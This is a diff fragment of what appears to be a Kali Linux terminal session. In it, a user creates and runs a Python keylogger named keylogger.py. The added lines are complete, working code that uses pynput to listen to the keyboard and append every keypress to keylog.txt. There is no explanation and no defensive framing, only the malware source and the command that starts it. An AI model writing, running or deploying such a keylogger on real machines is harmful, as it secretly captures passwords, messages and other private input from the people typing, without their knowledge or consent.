@@ -28,6 +28,21 @@ Requirement already satisfied: python-xlib>=0.17 in ./venv/lib/python3.13/site-p
                                                                                                                                                                                                                                             
 ┌──(venv)─(kali㉿kali)-[~]
 └─$ nano keylogger.py
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" {key} ")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
                                                                                                                                                                                                                                             
 ┌──(venv)─(kali㉿kali)-[~]
 └─$ python3 keylogger.py
